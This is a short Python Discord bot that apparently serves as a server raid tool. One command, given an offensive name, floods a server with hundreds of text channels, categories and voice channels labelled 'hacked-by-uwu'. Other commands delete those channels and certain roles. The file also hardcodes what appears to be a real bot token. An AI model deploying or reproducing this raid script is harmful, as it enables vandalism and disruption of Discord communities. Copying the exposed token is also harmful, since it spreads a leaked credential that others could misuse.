import discord
from discord.ext import commands
from discord.utils import get

client = commands.Bot(command_prefix='$') #This Is The Prefix, Feel Free To Change It Anytime

client.remove_command("help")


@client.event
async def on_ready():
    print ("bot is now online")

@client.command(pass_context=True)
async def rape(ctx):
    for i in range(300): #400 is limit of discord channels
        guild = ctx.message.guild
        await guild.create_text_channel('hacked-by-uwu')
        await guild.create_category('Hacked by uwu')
        await guild.create_voice_channel('Hacked by uwu')

@client.command(pass_context=True)
async def dele(ctx):
    for i in range(400):
    	for chann in ctx.guild.channels:
	       		if chann.name == "hacked-by-uwu" or chann.name == "Hacked by uwu":
	       			await chann.delete()
	       			
@client.command(pass_context=True)
async def dela(ctx):
    guild = ctx.message.guild
    for role in guild.roles:
        if role.name == 'new role':
            await role.delete()


client.run('NzMzMzM5NjE0NTUwNjg3ODc0.XxBtvA.MfkYVtvxKDnjLfR8CAEhRPlMekg') #Bot's Token Code Goes Here